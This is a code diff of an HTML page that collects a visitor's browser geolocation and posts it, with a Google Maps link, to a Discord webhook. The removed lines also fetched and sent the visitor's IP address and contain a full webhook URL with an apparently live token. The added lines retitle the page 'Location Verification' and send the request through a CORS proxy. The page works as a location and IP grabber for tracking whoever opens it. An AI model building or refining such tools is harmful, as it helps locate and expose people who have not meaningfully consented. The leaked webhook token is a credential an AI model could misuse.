@@ -1,32 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Location + IP to Discord</title>
+  <title>Location Verification</title>
 </head>
 <body>
-  <h2>Click below to share your location and IP with Discord</h2>
-  <button onclick="sendInfo()">Send Info</button>
+  <h2>Click the button to share your location with Discord</h2>
+  <button onclick="sendLocation()">Send Location</button>
 
   <script>
-    const webhookURL = 'https://discord.com/api/webhooks/1379989806347452526/x-Nsnglyw0JcrRd4DMLPH9WYvBIGNpsgx7RA_eCTIDoDkqDmeK2rSbBe0KQdlfPOyL40'; // Replace with your webhook URL
+    const webhookURL = 'https://corsproxy.io/?https://discord.com/api/webhooks/XXXX/XXXX'; // Replace with your webhook URL
 
-    async function sendInfo() {
-      try {
-        // Get IP address
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        const ip = ipData.ip;
+    function sendLocation() {
+      if (!navigator.geolocation) {
+        alert("Geolocation is not supported by your browser.");
+        return;
+      }
 
-        // Get Geolocation
-        navigator.geolocation.getCurrentPosition(async (position) => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-          const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+      navigator.geolocation.getCurrentPosition(async (pos) => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
-          const payload = {
-            content: `🌐 **New User Info**\n📍 **Latitude:** ${lat}\n📍 **Longitude:** ${lon}\n📌 **Google Maps:** ${mapsLink}\n🧠 **IP Address:** ${ip}`
-          };
+        const payload = {
+          content: `📍 **Location Received**\nLatitude: ${lat}\nLongitude: ${lon}\n[View on Google Maps](${googleMapsLink})`
+        };
 
+        try {
           const res = await fetch(webhookURL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -34,19 +33,17 @@
           });
 
           if (res.ok) {
-            alert("✅ Location and IP sent to Discord!");
+            alert("✅ Location sent to Discord!");
           } else {
-            alert("❌ Failed to send data to Discord.");
+            alert("❌ Failed to send location.");
           }
-
-        }, (err) => {
-          alert("❌ Location access denied or failed.");
-        });
-
-      } catch (error) {
-        console.error(error);
-        alert("⚠️ Error occurred.");
-      }
+        } catch (err) {
+          console.error(err);
+          alert("⚠️ Error sending location.");
+        }
+      }, (err) => {
+        alert("❌ Permission denied or error getting location.");
+      });
     }
   </script>
 </body>
